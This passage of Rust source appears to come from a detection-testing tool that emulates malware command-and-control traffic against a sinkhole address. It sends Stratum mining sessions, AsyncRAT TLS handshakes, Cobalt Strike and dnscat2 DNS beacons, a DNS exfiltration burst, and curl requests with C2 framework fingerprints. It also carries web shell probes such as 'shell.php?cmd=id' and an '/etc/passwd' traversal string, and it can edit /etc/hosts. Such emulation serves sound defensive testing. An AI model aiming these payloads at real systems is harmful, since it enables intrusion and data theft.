                                            round + 1,
                                            e
                                        )
                                        .unwrap();
                                    }
                                    Err(_) => {
                                        writeln!(
                                            log,
                                            "Sent: mining.submit round {} (write timeout)",
                                            round + 1
                                        )
                                        .unwrap();
                                    }
                                }

                                // Read submit result + new mining.notify (server sends both)
                                let submit_lines =
                                    read_stratum_lines(&mut reader, 2, 3).await;
                                for line in &submit_lines {
                                    writeln!(log, "Recv: {}", line).unwrap();
                                    debug!("[T1071-IOC] Stratum recv: {}", line);
                                }
                                if let Some(id) = extract_notify_job_id(&submit_lines) {
                                    debug!(
                                        "[T1071-IOC] Stratum job_id updated after round {}: {}",
                                        round + 1,
                                        id
                                    );
                                    job_id = id;
                                } else {
                                    // No notify received (server silent or parse failed);
                                    // synthesise the next expected job_id (sb02, sb03, ...)
                                    // so each submit message stays distinct.
                                    let synthetic = format!("sb{:02}", round + 2);
                                    debug!(
                                        "[T1071-IOC] Stratum no notify after round {} - synthetic job_id: {}",
                                        round + 1,
                                        synthetic
                                    );
                                    job_id = synthetic;
                                }

                                // Wait ~1 second between rounds; skip wait after final round
                                if round < 3 {
                                    sleep(Duration::from_millis(1000)).await;
                                }
                            }

                            // ---- Phase: mining.ping / mining.pong ----
                            // Extended Stratum v1 keepalive — confirms the session is still
                            // live and generates one final bidirectional exchange.
                            match async_timeout(
                                Duration::from_secs(2),
                                write_half.write_all(STRATUM_PING.as_bytes()),
                            )
                            .await
                            {
                                Ok(Ok(())) => {
                                    debug!(
                                        "[T1071-IOC] Stratum mining.ping sent to {}",
                                        addr
                                    );
                                    writeln!(log, "Sent: mining.ping").unwrap();
                                }
                                Ok(Err(e)) => {
                                    writeln!(log, "Sent: mining.ping (write error: {})", e)
                                        .unwrap();
                                }
                                Err(_) => {
                                    writeln!(log, "Sent: mining.ping (write timeout)").unwrap();
                                }
                            }
                            let pong_lines = read_stratum_lines(&mut reader, 2, 2).await;
                            for line in &pong_lines {
                                writeln!(log, "Recv: {}", line).unwrap();
                                debug!("[T1071-IOC] Stratum pong: {}", line);
                            }

                            // Top-up sleep to guarantee >= 5 seconds total dwell time
                            let elapsed = session_start.elapsed();
                            if elapsed < std::time::Duration::from_secs(5) {
                                let top_up =
                                    std::time::Duration::from_secs(5) - elapsed;
                                debug!(
                                    "[T1071-IOC] Stratum top-up sleep {}ms to reach 5s dwell at {}",
                                    top_up.as_millis(),
                                    addr
                                );
                                sleep(Duration::from_millis(
                                    top_up.as_millis() as u64,
                                ))
                                .await;
                            }

                            let total = session_start.elapsed();
                            writeln!(
                                log,
                                "Session complete: {:.1}s dwell, 4 submit rounds, final job_id={}",
                                total.as_secs_f32(),
                                job_id
                            )
                            .unwrap();
                            debug!(
                                "[T1071-IOC] Stratum session complete at {} ({:.1}s, job={})",
                                addr,
                                total.as_secs_f32(),
                                job_id
                            );
                        }
                        Ok(Err(e)) => {
                            // Refused: TCP SYN was sent and rejected — telemetry generated
                            println!("REFUSED [{}]", via_note);
                            writeln!(log, "TCP: REFUSED ({})", e).unwrap();
                            debug!(
                                "[T1071-IOC] Stratum connect refused at {}: {}",
                                addr, e
                            );
                        }
                        Err(_) => {
                            // Timeout: SYN was sent, no response — telemetry generated
                            println!("TIMEOUT [{}]", via_note);
                            writeln!(log, "TCP: TIMEOUT").unwrap();
                            debug!("[T1071-IOC] Stratum connect timeout at {}", addr);
                        }
                    }

                    writeln!(log).unwrap();
                }
            }

            println!("{}", "-".repeat(60));
            println!(
                "[T1071-IOC] Stratum phase: {} attempts, {} connected",
                stratum_attempts, stratum_connected
            );

            writeln!(log, "=== Stratum Summary ===").unwrap();
            writeln!(log, "Attempts: {}", stratum_attempts).unwrap();
            writeln!(log, "Connected: {}", stratum_connected).unwrap();
            writeln!(
                log,
                "Refused/Timeout: {}",
                stratum_attempts - stratum_connected
            )
            .unwrap();

            info!(
                "[T1071-IOC] Stratum phase complete: {} attempts, {} connected",
                stratum_attempts, stratum_connected
            );

            // =================================================================
            // Phase 3: AsyncRAT TLS Certificate Simulation
            // =================================================================
            // Initiates a TLS 1.2 handshake to sinkhole_ip:8888 via openssl s_client.
            // The sinkhole presents a self-signed certificate with CN=AsyncRAT Server.
            // TLS 1.2 is required: in TLS 1.3 the Certificate message is encrypted,
            // making the CN= IOC invisible to PA-440 inline inspection without full
            // SSL decryption.  -tls1_2 forces the older record format so the
            // Certificate appears in plaintext on the wire.

            println!("\n[T1071-IOC] Phase 3: AsyncRAT TLS Certificate Simulation");
            println!("{}", "-".repeat(60));
            writeln!(log, "\n=== Phase 3: AsyncRAT TLS ===").unwrap();
            let asyncrat_addr = format!("{}:8888", sinkhole_ip);
            writeln!(log, "Target: {}", asyncrat_addr).unwrap();
            writeln!(log, "SNI: asyncrat.signalbench.local").unwrap();
            print!("  {:<48} ", asyncrat_addr);

            match async_timeout(
                Duration::from_secs(u64::from(timeout) + 2),
                Command::new("openssl")
                    .args([
                        "s_client",
                        "-connect",
                        &asyncrat_addr,
                        "-tls1_2",
                        "-brief",
                        "-servername",
                        "asyncrat.signalbench.local",
                    ])
                    .stdin(Stdio::null())
                    .output(),
            )
            .await
            {
                Ok(Ok(output)) => {
                    let stdout = String::from_utf8_lossy(&output.stdout);
                    let ec = output.status.code().unwrap_or(-1);
                    let cert_line = stdout
                        .lines()
                        .find(|l| {
                            l.contains("subject") || l.contains("CN=") || l.contains("issuer")
                        })
                        .unwrap_or("(no cert info)");
                    if ec == 0 || stdout.contains("CONNECTION ESTABLISHED") {
                        println!("CONNECTED");
                        writeln!(log, "AsyncRAT TLS: CONNECTED ({})", cert_line.trim()).unwrap();
                        info!(
                            "[T1071-IOC] AsyncRAT TLS connected to {}: {}",
                            asyncrat_addr,
                            cert_line.trim()
                        );
                    } else {
                        println!("ATTEMPTED (ec={})", ec);
                        writeln!(log, "AsyncRAT TLS: ATTEMPTED (ec={}, {})", ec, cert_line.trim())
                            .unwrap();
                        info!(
                            "[T1071-IOC] AsyncRAT TLS attempted {}: ec={}",
                            asyncrat_addr, ec
                        );
                    }
                }
                Ok(Err(e)) => {
                    println!("ERROR ({})", e);
                    writeln!(log, "AsyncRAT TLS: ERROR ({})", e).unwrap();
                    debug!(
                        "[T1071-IOC] AsyncRAT TLS error at {}: {} (openssl not installed?)",
                        asyncrat_addr, e
                    );
                }
                Err(_) => {
                    println!("TIMEOUT");
                    writeln!(log, "AsyncRAT TLS: TIMEOUT").unwrap();
                    debug!("[T1071-IOC] AsyncRAT TLS timeout at {}", asyncrat_addr);
                }
            }
            println!("{}", "-".repeat(60));

            // =================================================================
            // Phase 4: Malware DNS Probe Simulation
            // =================================================================
            // Sends raw UDP/53 packets to sinkhole_ip:
            //   dnscat2:        78-byte probe matching snort3-malware-cnc.rules
            //                   sid:MALWARE-CNC dnscat2 DNS tunneling initialization
            //   Cobalt Strike:  27-byte QTYPE A beacon (sid:45906) +
            //                   27-byte QTYPE TXT beacon (sid:45907)
            //   T1048 exfil:    120-query high-volume burst (3 x 60-char
            //                   URL-safe-base64 labels/query, ~16.2 KB encoded
            //                   under t1048.signalbench.sigre.xyz at 10 QPS)

            println!("\n[T1071-IOC] Phase 4: Malware DNS Probe Simulation");
            println!("{}", "-".repeat(60));
            writeln!(log, "\n=== Phase 4: DNS Probes ===").unwrap();
            writeln!(log, "Target: {}:53 (UDP)", sinkhole_ip).unwrap();

            let mut dns_sent: u32 = 0;
            match UdpSocket::bind("0.0.0.0:0").await {
                Ok(sock) => {
                    let dns_target = format!("{}:53", sinkhole_ip);

                    // dnscat2 DNS probe (78 bytes)
                    let dnscat2_pkt = build_dnscat2_dns_packet();
                    match sock.send_to(&dnscat2_pkt, &dns_target).await {
                        Ok(n) => {
                            dns_sent += 1;
                            writeln!(log, "dnscat2 DNS: {} bytes sent to {}", n, dns_target)
                                .unwrap();
                            info!(
                                "[T1071-IOC] dnscat2 DNS probe: {} bytes to {}",
                                n, dns_target
                            );
                            println!(
                                "  [-->] dnscat2 DNS probe sent ({} bytes to {})",
                                n, dns_target
                            );
                        }
                        Err(e) => {
                            writeln!(log, "dnscat2 DNS: ERROR ({})", e).unwrap();
                            debug!("[T1071-IOC] dnscat2 DNS send error: {}", e);
                        }
                    }

                    // Cobalt Strike DNS A beacon (27 bytes, sid:45906)
                    let cs_a_pkt = build_cobalt_strike_dns_packet(1);
                    match sock.send_to(&cs_a_pkt, &dns_target).await {
                        Ok(n) => {
                            dns_sent += 1;
                            writeln!(log, "CS DNS A: {} bytes sent to {}", n, dns_target).unwrap();
                            info!(
                                "[T1071-IOC] CS DNS A beacon: {} bytes to {}",
                                n, dns_target
                            );
                            println!(
                                "  [-->] Cobalt Strike DNS A beacon sent ({} bytes to {})",
                                n, dns_target
                            );
                        }
                        Err(e) => {
                            writeln!(log, "CS DNS A: ERROR ({})", e).unwrap();
                            debug!("[T1071-IOC] CS DNS A send error: {}", e);
                        }
                    }

                    // Cobalt Strike DNS TXT beacon (27 bytes, sid:45907)
                    let cs_txt_pkt = build_cobalt_strike_dns_packet(16);
                    match sock.send_to(&cs_txt_pkt, &dns_target).await {
                        Ok(n) => {
                            dns_sent += 1;
                            writeln!(log, "CS DNS TXT: {} bytes sent to {}", n, dns_target)
                                .unwrap();
                            info!(
                                "[T1071-IOC] CS DNS TXT beacon: {} bytes to {}",
                                n, dns_target
                            );
                            println!(
                                "  [-->] Cobalt Strike DNS TXT beacon sent ({} bytes to {})",
                                n, dns_target
                            );
                        }
                        Err(e) => {
                            writeln!(log, "CS DNS TXT: ERROR ({})", e).unwrap();
                            debug!("[T1071-IOC] CS DNS TXT send error: {}", e);
                        }
                    }

                    // T1048 Exfiltration Over Alternative Protocol -- high-volume
                    // DNS burst.  120 queries at 10 QPS, alternating A/TXT, each
                    // carrying 3 x 60-char URL-safe-base64 labels (135 raw bytes
                    // encoded per query => 16,200 bytes total), all under
                    // t1048.signalbench.sigre.xyz.  Clears the >15 KB
                    // single-domain exfil threshold in ~12 s.  Mirrors the
                    // Python test client's build_t1048_high_volume_exfil_packet.
                    let mut hv_sent: u32 = 0;
                    let mut hv_errors: u32 = 0;
                    let mut hv_encoded_total: usize = 0;
                    let hv_delay = Duration::from_millis(1000 / T1048_HV_QPS);
                    for i in 0..T1048_HV_TOTAL_QUERIES {
                        let qtype: u16 = if i % 2 == 0 { 1 } else { 16 };
                        let txid: u16 = 0x1000u16.wrapping_add((i & 0x0FFF) as u16);
                        let (hv_pkt, encoded) =
                            build_t1048_high_volume_exfil_packet(qtype, txid);
                        match sock.send_to(&hv_pkt, &dns_target).await {
                            Ok(_) => {
                                hv_sent += 1;
                                hv_encoded_total += encoded;
                            }
                            Err(e) => {
                                hv_errors += 1;
                                if hv_errors <= 3 {
                                    debug!("[T1071-IOC] T1048 HV exfil send error: {}", e);
                                }
                            }
                        }
                        sleep(hv_delay).await;
                    }
                    dns_sent += hv_sent;
                    writeln!(
                        log,
                        "T1048 HV exfil burst: {} queries sent ({} errors), {} bytes \
                         encoded under t1048.signalbench.sigre.xyz",
                        hv_sent, hv_errors, hv_encoded_total
                    )
                    .unwrap();
                    info!(
                        "[T1071-IOC] T1048 HV exfil burst: {} queries, {} bytes encoded \
                         under t1048.signalbench.sigre.xyz",
                        hv_sent, hv_encoded_total
                    );
                    println!(
                        "  [-->] T1048 high-volume exfil burst: {} queries, {} bytes \
                         encoded under t1048.signalbench.sigre.xyz",
                        hv_sent, hv_encoded_total
                    );
                }
                Err(e) => {
                    writeln!(log, "UDP socket bind: ERROR ({})", e).unwrap();
                    warn!("[T1071-IOC] Phase 4: failed to bind UDP socket: {}", e);
                }
            }
            println!("{}", "-".repeat(60));
            println!(
                "[T1071-IOC] DNS probe phase: {} packets sent to {}:53",
                dns_sent, sinkhole_ip
            );
            writeln!(log, "DNS probes sent: {}", dns_sent).unwrap();

            // =================================================================
            // Phases 1-4 combined summary
            // =================================================================

            writeln!(log, "\n=== Overall Summary ===").unwrap();
            writeln!(log, "Phase 1 - Domain connections attempted: {}", connection_count).unwrap();
            writeln!(log, "Phase 1 - Successful: {}", successful_connections).unwrap();
            writeln!(
                log,
                "Phase 1 - Failed: {}",
                connection_count - successful_connections
            )
            .unwrap();
            writeln!(log, "Phase 1 - Skipped: {}", skipped_count).unwrap();
            writeln!(log, "Phase 2 - Stratum attempts: {}", stratum_attempts).unwrap();
            writeln!(log, "Phase 2 - Stratum connected: {}", stratum_connected).unwrap();
            writeln!(log, "Phase 3 - AsyncRAT TLS target: {}", asyncrat_addr).unwrap();
            writeln!(log, "Phase 4 - DNS probes sent: {}", dns_sent).unwrap();
            if hosts_modified {
                writeln!(log, "Hosts file modified: yes (cleanup required)").unwrap();
            }

            // Console summary
            println!("\n{}", "-".repeat(60));
            println!(
                "[T1071-IOC] Summary: {} domain connections ({} ok, {} failed, {} skipped) | \
                 {} Stratum attempts ({} connected) | AsyncRAT TLS -> {}:8888 | \
                 {} DNS probes (dnscat2 + CS A/TXT + T1048 exfil burst)",
                connection_count,
                successful_connections,
                connection_count - successful_connections,
                skipped_count,
                stratum_attempts,
                stratum_connected,
                sinkhole_ip,
                dns_sent
            );
            println!("{}", "-".repeat(60));

            info!(
                "[T1071-IOC] Complete: {} domain connections ({} ok, {} skipped), \
                 {} Stratum attempts ({} connected), AsyncRAT TLS, {} DNS probes",
                connection_count, successful_connections, skipped_count,
                stratum_attempts, stratum_connected, dns_sent
            );

            // Build artifacts list, including hosts marker if modified
            let mut artifacts = vec![log_file.clone()];
            if hosts_modified {
                artifacts.push(HOSTS_ARTIFACT_MARKER.to_string());
            }

            Ok(SimulationResult {
                technique_id: self.info().id,
                success: true,
                message: format!(
                    "Completed {} domain connections ({} ok, {} failed, {} skipped), \
                     {} Stratum TCP attempts ({} connected), AsyncRAT TLS handshake to {}:8888, \
                     and {} DNS probes (dnscat2 + CS A/TXT beacons + T1048 exfil burst)",
                    connection_count,
                    successful_connections,
                    connection_count - successful_connections,
                    skipped_count,
                    stratum_attempts,
                    stratum_connected,
                    sinkhole_ip,
                    dns_sent
                ),
                artifacts,
                cleanup_required: true,
            })
        })
    }

    fn cleanup<'a>(&'a self, artifacts: &'a [String]) -> CleanupFuture<'a> {
        Box::pin(async move {
            debug!("[T1071-IOC] Starting cleanup");

            // Check if we need to clean up /etc/hosts
            if artifacts.contains(&HOSTS_ARTIFACT_MARKER.to_string()) {
                if is_running_as_root() {
                    match remove_hosts_entries() {
                        Ok(()) => {
                            info!("[T1071-IOC] Successfully cleaned up /etc/hosts entries");
                        }
                        Err(e) => {
                            warn!("[T1071-IOC] Failed to clean up /etc/hosts: {}", e);
                        }
                    }
                } else {
                    warn!("[T1071-IOC] Cannot clean up /etc/hosts without root privileges");
                    warn!("[T1071-IOC] Manually remove entries between {} and {}",
                        HOSTS_MARKER_START, HOSTS_MARKER_END);
                }
            }

            // Clean up log files and marker
            for artifact in artifacts {
                if Path::new(artifact).exists() {
                    if let Err(e) = fs::remove_file(artifact) {
                        warn!("[T1071-IOC] Failed to remove {}: {}", artifact, e);
                    } else {
                        debug!("[T1071-IOC] Removed: {}", artifact);
                    }
                }
            }

            info!("[T1071-IOC] Cleanup complete");
            Ok(())
        })
    }
}

// ============================================================
// T1071-IOC split: 4 independently executable technique IDs.
// The old SuspiciousDomainConnections struct remains in this file
// (pub = no dead_code lint) but is no longer registered in
// get_all_techniques() in techniques/mod.rs.
// ============================================================

pub struct SuspiciousDomainsHttp {}

#[async_trait]
impl AttackTechnique for SuspiciousDomainsHttp {
    fn info(&self) -> Technique {
        Technique {
            id: "T1071-IOC-HTTP".to_string(),
            name: "Suspicious Domain Connections - HTTP C2 Framework Profiling".to_string(),
            description: "HTTP C2 framework profiling across 20 suspicious domains via the \
                sinkhole. Sends framework-fingerprinted HTTP requests: PoshC2 (10 binary-variant \
                POSTs, SessionID= cookie, /news.php, sid:MALWARE-CNC Win.Trojan.PoshC2), Sliver \
                (19 requests covering sids 57675-57682 numeric-nonce, Immersive Labs \
                .woff/.html/.png variants, 8 Razy hex-nonce requests), Cobalt Strike (6 patterns: \
                sids 63772/65446/300048/54175/54182/56616 + /track Razy beacon), AdaptixC2 BEACON \
                (POST /uri.php + /endpoint/api, Firefox 20 UA, X-Beacon-Id/X-App-Id headers), \
                PowerShell Empire (IE11 UA, RoutingPacket session cookie), Mythic \
                (JhY3Rpb24iOi base64 URI), Havoc (3-request DEADBEEF/B16B00B5 magic-byte \
                sequence), web shell probes, and standard framework profiles on port 4444."
                .to_string(),
            category: "COMMAND_AND_CONTROL".to_string(),
            parameters: vec![
                TechniqueParameter {
                    name: "log_file".to_string(),
                    description: "Path to save connection log".to_string(),
                    required: false,
                    default: Some("/tmp/signalbench_t1071_http.log".to_string()),
                },
                TechniqueParameter {
                    name: "timeout".to_string(),
                    description: "Connection timeout in seconds".to_string(),
                    required: false,
                    default: Some("3".to_string()),
                },
            ],
            detection: "Monitor for: DNS queries to suspicious TLDs (.tk, .ru, .cn), \
                connections to port 4444 with C2 HTTP fingerprints (PoshC2 SessionID= cookie, \
                Sliver PHPSESSID+MSIE+?_=, CS auth_token cookie, Havoc DEADBEEF/B16B00B5 binary \
                POST body, AdaptixC2 X-Beacon-Id header, Empire RoutingPacket cookie, Mythic \
                JhY3Rpb24iOi base64 URI path)."
                .to_string(),
            cleanup_support: true,
            platforms: vec!["Linux".to_string()],
            permissions: vec!["user".to_string()],
            voltron_only: false,
        }
    }

    fn execute<'a>(&'a self, config: &'a TechniqueConfig, dry_run: bool) -> ExecuteFuture<'a> {
        Box::pin(async move {
            let log_file = config
                .parameters
                .get("log_file")
                .cloned()
                .unwrap_or_else(|| "/tmp/signalbench_t1071_http.log".to_string());
            let timeout = config
                .parameters
                .get("timeout")
                .and_then(|t| t.parse::<u32>().ok())
                .unwrap_or(3);

            let suspicious_domains = vec![
                ("signalbench-c2-test.tk", "Suspicious TLD (.tk)"),
                ("signalbench-malware.ru", "Suspicious TLD (.ru)"),
                ("signalbench-backdoor.cn", "Suspicious TLD (.cn)"),
                ("signalbench-rat.xyz", "Suspicious TLD (.xyz)"),
                ("signalbench-payload.top", "Suspicious TLD (.top)"),
                ("xk8f2m9p3q.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
                ("a1b2c3d4e5f6.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
                ("q9w8e7r6t5.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
                ("update.signalbench-services.com", "Update masquerading"),
                ("cdn.signalbench-delivery.net", "CDN masquerading"),
                ("api.signalbench-auth.io", "API masquerading"),
                ("n7v3x8q2z1.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
                ("k4p9m2r7w5.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
                ("h6t1s4b8j3.t1071.signalbench.sigre.xyz", "DGA-like pattern"),
                ("signalbench.onion.link", "Tor proxy pattern"),
                ("pool.signalbench-mining.com", "Mining pool pattern"),
                ("stratum.signalbench-crypto.net", "Stratum protocol pattern"),
                ("signalbench-mythic.pw", "Mythic C2 pattern (.pw TLD)"),
                ("signalbench-havoc.cc", "Havoc C2 pattern (.cc TLD)"),
                ("signalbench-empire.net", "PowerShell Empire C2 listener (.net masquerade)"),
            ];

            let profiles = c2_profiles();

            if dry_run {
                info!(
                    "[DRY RUN] T1071-IOC-HTTP: Would connect to {} suspicious domains ({} with C2 profiles)",
                    suspicious_domains.len(),
                    C2_PROFILED_DOMAINS.len()
                );
                for (domain, reason) in &suspicious_domains {
                    if let Some(p) = profiles.iter().find(|p| p.domain == *domain) {
                        info!("[DRY RUN] - {} ({}) [{}]", domain, reason, p.framework);
                    } else {
                        info!("[DRY RUN] - {} ({})", domain, reason);
                    }
                }
                return Ok(SimulationResult {
                    technique_id: "T1071-IOC-HTTP".to_string(),
                    success: true,
                    message: format!(
                        "DRY RUN: Would connect to {} suspicious domains ({} with C2 framework profiles)",
                        suspicious_domains.len(),
                        C2_PROFILED_DOMAINS.len()
                    ),
                    artifacts: vec![log_file],
                    cleanup_required: false,
                });
            }

            let running_as_root = is_running_as_root();
            let sinkhole_ip = resolve_sinkhole_ip().await;
            let mut hosts_modified = false;

            if running_as_root {
                info!("[T1071-IOC-HTTP] Running as root, adding safe test entries to /etc/hosts");
                match add_hosts_entries(&sinkhole_ip) {
                    Ok(added) => {
                        hosts_modified = added;
                        if added {
                            println!("[OK] Added safe test entries to /etc/hosts");
                        } else {
                            println!("[OK] Safe test entries already present in /etc/hosts");
                        }
                    }
                    Err(e) => {
                        error!("[T1071-IOC-HTTP] Failed to add hosts entries: {}", e);
                        println!("[WARN] Failed to add hosts entries: {}", e);
                    }
                }
            }

            let mut log = File::create(&log_file)
                .map_err(|e| format!("Failed to create log file: {}", e))?;
            writeln!(log, "# SignalBench T1071-IOC-HTTP - HTTP C2 Framework Profiling").unwrap();
            writeln!(log, "# Timestamp: {}", chrono::Local::now()).unwrap();
            writeln!(log, "# Total domains: {}", suspicious_domains.len()).unwrap();
            writeln!(log, "# Timeout: {} seconds", timeout).unwrap();
            writeln!(log, "# Running as root: {}", running_as_root).unwrap();
            writeln!(log, "# --------------------------------------------------------\n").unwrap();

            let mut connection_count = 0;
            let mut successful_connections = 0;
            let mut skipped_count = 0;
            let mut skipped_domains: Vec<&str> = Vec::new();

            println!("\n[T1071-IOC-HTTP] HTTP C2 Framework Profiling");
            println!("{}", "-".repeat(60));
            println!("{:<45} REASON", "TARGET");
            println!("{}", "-".repeat(60));
            for (domain, reason) in &suspicious_domains {
                println!("  {:<43} {}", domain, reason);
            }
            println!("{}", "-".repeat(60));
            println!();

            let is_fallback = sinkhole_ip == SAFE_TEST_IP_FALLBACK;
            let dig_available = crate::utils::is_command_available("dig").await;

            for (domain, reason) in &suspicious_domains {
                let domain_is_safe = is_safe_domain(domain);

                if !domain_is_safe && !running_as_root {
                    let resolves_safely =
                        domain_resolves_to_safe_ip(domain, &sinkhole_ip).await;
                    if !resolves_safely {
                        skipped_count += 1;
                        skipped_domains.push(domain);
                        println!("[WARN] Skipping: {} (not configured in /etc/hosts)", domain);
                        writeln!(log, "=== Skipped: {} ===", domain).unwrap();
                        writeln!(
                            log,
                            "Reason: Unowned domain not configured in /etc/hosts"
                        )
                        .unwrap();
                        writeln!(log).unwrap();
                        continue;
                    }
                }

                connection_count += 1;
                println!("[T1071-IOC-HTTP] Connecting: {} ...", domain);
                writeln!(log, "=== Connection {} ===", connection_count).unwrap();
                writeln!(log, "Target: {}", domain).unwrap();
                writeln!(log, "Reason: {}", reason).unwrap();
                writeln!(log, "Safe domain: {}", domain_is_safe).unwrap();
                writeln!(log, "Time: {}", chrono::Local::now()).unwrap();

                if let Some(profile) = profiles.iter().find(|p| p.domain == *domain) {
                    writeln!(log, "Framework: {}", profile.framework).unwrap();
                    writeln!(log, "C2 pattern: {}", profile.reason).unwrap();

                    if profile.domain == "cdn.signalbench-delivery.net" {
                        println!(
                            "[T1071-IOC-HTTP]   Framework: {} (4 sequential web shell probe requests)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: web shell probe (4 sequential requests on port 4444)"
                        )
                        .unwrap();
                        let ws_ua = profile.user_agent;
                        let ws_base = format!("http://{}:4444", sinkhole_ip);
                        let ws_host_hdr = format!("Host: {}", profile.domain);
                        type WsProbe = (
                            &'static str,
                            &'static str,
                            Option<&'static str>,
                            Option<&'static str>,
                        );
                        let ws_probes: &[WsProbe] = &[
                            ("GET", "/uploads/files/shell.php?cmd=id", None, None),
                            (
                                "GET",
                                "/wp-content/plugins/backup/shell.php?z0=QGluaV9zZXQoJ2Rpc3BsYXlfZXJyb3JzJywgJzAnKTs%3D&z1=Y21k&z2=aWQ%3D",
                                None,
                                None,
                            ),
                            (
                                "GET",
                                "/app/webroot/files/update.aspx?codes=base64&clazz=SolarWinds.Orion&method=TestMethod&args=whoami",
                                None,
                                None,
                            ),
                            (
                                "POST",
                                "/cgi-bin/php.cgi",
                                Some("cmd=id&passwd=../../../etc/passwd"),
                                Some("application/x-www-form-urlencoded"),
                            ),
                        ];
                        let mut ws_any_ok = false;
                        for &(ws_method, ws_path, ws_body, ws_ct) in ws_probes {
                            let ws_url = format!("{}{}", ws_base, ws_path);
                            let mut ws_args: Vec<String> = vec![
                                "-s".to_string(),
                                "-o".to_string(),
                                "/dev/null".to_string(),
                                "-w".to_string(),
                                "%{http_code},%{time_total},%{remote_ip}".to_string(),
                                "--max-time".to_string(),
                                timeout.to_string(),
                                "--connect-timeout".to_string(),
                                timeout.to_string(),
                                "-A".to_string(),
                                ws_ua.to_string(),
                                "-X".to_string(),
                                ws_method.to_string(),
                                "-H".to_string(),
                                ws_host_hdr.clone(),
                            ];
                            if let Some(ct) = ws_ct {
                                ws_args.push("-H".to_string());
                                ws_args.push(format!("Content-Type: {}", ct));
                            }
                            if let Some(body) = ws_body {
                                ws_args.push("--data-raw".to_string());
                                ws_args.push(body.to_string());
                            }
                            ws_args.push(ws_url);
                            writeln!(log, "Probe: {} {}", ws_method, ws_path).unwrap();
                            match Command::new("curl").args(&ws_args).output().await {
                                Ok(output) => {
                                    let result = String::from_utf8_lossy(&output.stdout);
                                    let ec = output.status.code().unwrap_or(-1);
                                    if is_fallback {
                                        writeln!(log, "Probe: SENT (fallback)").unwrap();
                                    } else if ec == 0 {
                                        if !ws_any_ok {
                                            successful_connections += 1;
                                            ws_any_ok = true;
                                        }
                                        writeln!(
                                            log,
                                            "Probe: SUCCESS ({})",
                                            result.trim()
                                        )
                                        .unwrap();
                                    } else {
                                        writeln!(log, "Probe: FAILED (ec={})", ec).unwrap();
                                    }
                                }
                                Err(e) => {
                                    writeln!(log, "Probe: ERROR ({})", e).unwrap();
                                }
                            }
                        }
                        if is_fallback {
                            println!(
                                "  [-->] Web shell probe sent (fallback, 4 requests)"
                            );
                        } else if ws_any_ok {
                            println!("  [OK] Web shell probe complete (4 requests)");
                        } else {
                            println!("  [--] Web shell probe failed (4 requests)");
                        }
                    } else if profile.domain == "signalbench-backdoor.cn" {
                        println!(
                            "[T1071-IOC-HTTP]   Framework: {} (10 binary-variant POST requests)",
                            profile.framework
                        );
                        writeln!(
                            log,
                            "Mode: PoshC2 10-variant POST sequence (port 4444)"
                        )
                        .unwrap();
                        let poshc2_host = format!("Host: {}", profile.domain);
                        let poshc2_url =
                            format!("http://{}:4444/news.php", sinkhole_ip);
                        let mut poshc2_any_ok = false;
                        for (vi, variant_bytes) in POSHC2_VARIANTS.iter().enumerate() {
                            let session_b64 = B64URL
                                .encode(&variant_bytes[..16])
                                .trim_end_matches('=')
                                .to_string();
                            let mut poshc2_args: Vec<String> = vec![
                                "-s".to_string(),
                                "-o".to_string(),
                                "/dev/null".to_string(),
                                "-w".to_string(),
                                "%{http_code},%{time_total},%{remote_ip}".to_string(),
                                "--max-time".to_string(),
                                timeout.to_string(),
                                "--connect-timeout".to_string(),
                                timeout.to_string(),
                                "-X".to_string(),
                                "POST".to_string(),
                                "-A".to_string(),
                                profile.user_agent.to_string(),
                                "-H".to_string(),
                                poshc2_host.clone(),
                                "-H".to_string(),
                                format!("Cookie: SessionID={}", session_b64),
                                "-H".to_string(),
                                "X-Requested-With: XMLHttpRequest".to_string(),
                                "-H".to_string(),
                                "Content-Type: application/octet-stream".to_string(),
                            ];
                            if let Ok(mut tf) = tempfile::NamedTempFile::new() {
                                if tf.write_all(&poshc2_body(variant_bytes)).is_ok() {
                                    let p = tf.path().to_string_lossy().to_string();
                                    poshc2_args.push("-d".to_string());
                                    poshc2_args.push(format!("@{}", p));
                                    poshc2_args.push(poshc2_url.clone());
                                    writeln!(
                                        log,
                                        "PoshC2 variant {}/10 (1500 bytes)",
                                        vi + 1
                                    )
                                    .unwrap();
                                    match Command::new("curl")
                                        .args(&poshc2_args)
                                        .output()
                                        .await
                                    {
                                        Ok(output) => {
                                            let res =
                                                String::from_utf8_lossy(&output.stdout);
                                            let ec =
                                                output.status.code().unwrap_or(-1);
                                            if is_fallback {
                                                writeln!(
                                                    log,
                                                    "PoshC2 {}/10: SENT (fallback)",
                                                    vi + 1
                                                )
                                                .unwrap();
                                            } else if ec == 0 {
                                                if !poshc2_any_ok {
                                                    successful_connections += 1;
                                                    poshc2_any_ok = true;
                                                }
                                                writeln!(
                                                    log,
                                                    "PoshC2 {}/10: SUCCESS ({})",
                                                    vi + 1,
                                                    res.trim()
                                                )
                                                .unwrap();
                                            } else {
                                                writeln!(
                                                    log,
                                                    "PoshC2 {}/10: FAILED (ec={})",
                                                    vi + 1,
                                                    ec
                                                )
                                                .unwrap();
                                            }
                                        }
                                        Err(e) => {
                                            writeln!(
                                                log,
                                                "PoshC2 {}/10: ERROR ({})",
                                                vi + 1,
                                                e
                                            )
                                            .unwrap();
                                        }
                                    }
                                }
                            }
                        }
                        if is_fallback {
                            println!(
                                "  [-->] PoshC2 10-variant POST sequence sent (fallback)"
                            );
                        } else if poshc2_any_ok {
                            println!(
                                "  [OK] PoshC2 10-variant POST sequence complete"
                            );
                        } else {
                            println!(
                                "  [--] PoshC2 10-variant POST sequence failed"
                            );
                        }
                        let poshc2_tls_addr = format!("{}:443", sinkhole_ip);
                        print!(
                            "  {:<48} ",
                            "PoshC2 TLS 1.2 cert (CN=P18055077, port 443)"
                        );
                        writeln!(
                            log,
                            "PoshC2 TLS: target={}",
                            poshc2_tls_addr
                        )
                        .unwrap();
                        match async_timeout(
                            Duration::from_secs(u64::from(timeout) + 2),
                            Command::new("openssl")
                                .args([
                                    "s_client",
                                    "-connect",
                                    &poshc2_tls_addr,
                                    "-tls1_2",
                                    "-brief",
                                    "-servername",
                                    "signalbench-backdoor.cn",
                                ])
                                .stdin(Stdio::null())
                                .output(),
                        )
                        .await
                        {
                            Ok(Ok(output)) => {
                                let stdout =
                                    String::from_utf8_lossy(&output.stdout);
